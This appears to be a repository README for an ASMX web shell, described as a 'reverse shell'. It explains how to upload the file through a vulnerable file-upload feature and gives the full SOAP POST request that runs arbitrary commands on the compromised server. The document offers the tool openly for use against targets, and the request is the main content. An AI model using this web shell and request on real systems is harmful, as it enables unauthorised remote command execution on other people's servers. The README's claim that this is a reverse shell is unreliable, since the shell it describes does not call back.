# asmx reverse shell

This repository contains an asmx reverse shell for achieving code execution using file upload functionality.

## Steps for Code Execution

1. **Upload the Reverse Shell File:**
   - Upload `ShellCmdService.asmx` to the target machine. This can be done through a vulnerable file upload functionality on a web application.

2. **Execute Commands:**
   - Send a POST request to target using Burp Suite.

   Example request:

   ```bash
   POST /ShellCmdService.asmx HTTP/1.1
   Host: 127.0.0.1
   Content-Type: text/xml
   Content-Length: 347

   <?xml version="1.0" encoding="utf-8"?>
   <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
     <soap:Body>
       <ExecCommand xmlns="http://tempuri.org/">
         <cmd>Command</cmd>
       </ExecCommand>
     </soap:Body>
   </soap:Envelope>

Replace `127.0.0.1` with the actual host and modify <cmd>`Command`</cmd> with the command you want to execute on the target system.

Contributing

Contributions are welcome! If you have suggestions or improvements, feel free to open an issue or create a pull request.
